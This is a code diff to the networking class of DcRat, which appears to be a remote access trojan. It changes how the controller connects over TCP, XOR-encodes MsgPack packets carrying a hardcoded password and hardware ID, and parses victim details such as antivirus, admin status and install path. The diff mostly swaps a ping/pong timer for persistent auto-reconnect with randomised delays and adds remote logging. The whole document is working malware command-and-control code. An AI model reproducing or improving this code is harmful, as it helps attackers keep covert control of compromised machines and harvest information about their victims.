@@ -16,16 +16,14 @@ namespace DcRat.TCPSocket
 {
     class Connection
     {
-        public static Socket TcpClient { get; set; } //Main socket
+        public static Socket Client { get; set; } //Main socket
         private static byte[] Buffer { get; set; } //Socket buffer
         private static long HeaderSize { get; set; } //Recevied size
         private static long Offset { get; set; } // Buffer location
         private static Timer KeepAlive { get; set; } //Send Performance
         public static bool IsConnected { get; set; } //Check socket status
         private static object SendSync { get; } = new object(); //Sync send
-        private static Timer Ping { get; set; } //Send ping interval
         public static int Interval { get; set; } //ping value
-        public static bool ActivatePong { get; set; }
 
         public static List<MsgPack> Packs = new List<MsgPack>();
 
@@ -34,15 +32,15 @@ namespace DcRat.TCPSocket
             try
             {
 
-                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
                 };
 
-                TcpClient.Connect(Settings.Default.IP, Convert.ToInt32(Settings.Default.Port));
+                Client.Connect(Settings.Default.IP, Convert.ToInt32(Settings.Default.Port));
 
-                if (TcpClient.Connected)
+                if (Client.Connected)
                 {
                     IsConnected = true;
                     HeaderSize = 4;
@@ -50,48 +48,50 @@ namespace DcRat.TCPSocket
                     Offset = 0;
                     Send(SendInfo());
                     Interval = 0;
-                    ActivatePong = false;
                     KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
-                    Ping = new Timer(new TimerCallback(Pong), null, 1, 1);
-                    TcpClient.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                 }
                 else
                 {
-                    IsConnected = false;
+                    Reconnect();
                     return;
                 }
             }
             catch
             {
-                //Debug.WriteLine("Disconnected!");
-                IsConnected = false;
+                Thread.Sleep(new Random().Next(1 * 1000, 6 * 1000));
+                Reconnect();
                 return;
             }
         }
 
         public static void Reconnect()
         {
-
             try
             {
-                Ping?.Dispose();
                 KeepAlive?.Dispose();
-                TcpClient?.Dispose();
+                if (Client != null)
+                {
+                    Client.Close();
+                    Client.Dispose();
+                }
             }
             catch { }
+            InitializeClient();
             IsConnected = false;
+            
         }
 
         public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
         {
             try
             {
-                if (!TcpClient.Connected || !IsConnected)
+                if (!Client.Connected || !IsConnected)
                 {
-                    IsConnected = false;
+                    Reconnect();
                     return;
                 }
-                int recevied = TcpClient.EndReceive(ar);
+                int recevied = Client.EndReceive(ar);
                 if (recevied > 0)
                 {
                     Offset += recevied;
@@ -106,17 +106,17 @@ namespace DcRat.TCPSocket
                             Buffer = new byte[HeaderSize];
                             while (HeaderSize > 0)
                             {
-                                int rc = TcpClient.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
+                                int rc = Client.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
                                 if (rc <= 0)
                                 {
-                                    IsConnected = false;
+                                    Reconnect();
                                     return;
                                 }
                                 Offset += rc;
                                 HeaderSize -= rc;
                                 if (HeaderSize < 0)
                                 {
-                                    IsConnected = false;
+                                    Reconnect();
                                     return;
                                 }
                             }
@@ -136,20 +136,20 @@ namespace DcRat.TCPSocket
                     }
                     else if (HeaderSize < 0)
                     {
-                        IsConnected = false;
+                        Reconnect();
                         return;
                     }
-                    TcpClient.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                 }
                 else
                 {
-                    IsConnected = false;
+                    Reconnect();
                     return;
                 }
             }
             catch
             {
-                IsConnected = false;
+                Reconnect();
                 return;
             }
         }
@@ -168,13 +168,13 @@ namespace DcRat.TCPSocket
                     byte[] buffer = Xor((byte[])msg);
                     byte[] buffersize = BitConverter.GetBytes(buffer.Length);
 
-                    TcpClient.Poll(-1, SelectMode.SelectWrite);
-                    TcpClient.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
-                    TcpClient.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                    Client.Poll(-1, SelectMode.SelectWrite);
+                    Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
+                    Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
                 }
                 catch
                 {
-                    IsConnected = false;
+                    Reconnect();
                     return;
                 }
             }
@@ -185,22 +185,12 @@ namespace DcRat.TCPSocket
             try
             {
                 MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Type").AsString = "Controler";
                 msgpack.ForcePathObject("Packet").AsString = "Ping";
+                msgpack.ForcePathObject("Password").AsString = "qwqdanchun";
+                msgpack.ForcePathObject("HWID").AsString = HWID();
                 Send(msgpack.Encode2Bytes());
                 GC.Collect();
-                ActivatePong = true;
-            }
-            catch { }
-        }
-
-        private static void Pong(object obj)
-        {
-            try
-            {
-                if (ActivatePong && IsConnected)
-                {
-                    Interval++;
-                }
             }
             catch { }
         }
@@ -214,16 +204,6 @@ namespace DcRat.TCPSocket
                 unpack_msgpack.DecodeFromBytes(Xor((byte[])data));
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
-                    case "Pong": //send interval value to server
-                        {
-                            ActivatePong = false;
-                            MsgPack msgPack = new MsgPack();
-                            msgPack.ForcePathObject("Packet").SetAsString("Pong");
-                            msgPack.ForcePathObject("Message").SetAsInteger(Interval);
-                            Send(msgPack.Encode2Bytes());
-                            Interval = 0;
-                            break;
-                        }
 
                     case "ClientInfo":
                         {
@@ -236,7 +216,7 @@ namespace DcRat.TCPSocket
                             client.Info.InstallTime = unpack_msgpack.ForcePathObject("Install-Time").AsString;
                             client.Info.Path = unpack_msgpack.ForcePathObject("Path").AsString;
                             client.Info.Version = unpack_msgpack.ForcePathObject("Version").AsString;
-                            client.Info.Permission = unpack_msgpack.ForcePathObject("Permission").GetAsInteger();
+                            client.Info.Permission = unpack_msgpack.ForcePathObject("Admin").AsString;
                             client.Info.AV = unpack_msgpack.ForcePathObject("AV").AsString;
                             client.Info.Group = unpack_msgpack.ForcePathObject("Group").AsString;
                             client.Info.Active = unpack_msgpack.ForcePathObject("Active").AsString;
@@ -280,18 +260,33 @@ namespace DcRat.TCPSocket
         public static byte[] SendInfo()
         {
             MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "Controler";
-            msgpack.ForcePathObject("Type").AsString = "Connect";
+            msgpack.ForcePathObject("Type").AsString = "Controler";
+            msgpack.ForcePathObject("Packet").AsString = "Connect";
             msgpack.ForcePathObject("Password").AsString = "qwqdanchun";
             msgpack.ForcePathObject("HWID").AsString = HWID();
+
             return msgpack.Encode2Bytes();
         }
 
         public static void Error(string ex) //send to logs
         {
             MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Type").AsString = "Controler";
             msgpack.ForcePathObject("Packet").AsString = "Error";
+            msgpack.ForcePathObject("HWID").AsString = Connection.HWID();
+            msgpack.ForcePathObject("Password").AsString = "qwqdanchun";
             msgpack.ForcePathObject("Error").AsString = ex;
+            Send(msgpack.Encode2Bytes());
+        }
+
+        public static void Log(string log) //send to logs
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Type").AsString = "Controler";
+            msgpack.ForcePathObject("Packet").AsString = "Log";
+            msgpack.ForcePathObject("HWID").AsString = Connection.HWID();
+            msgpack.ForcePathObject("Password").AsString = "qwqdanchun";
+            msgpack.ForcePathObject("Message").AsString = log;
             Send(msgpack.Encode2Bytes());
         }
 
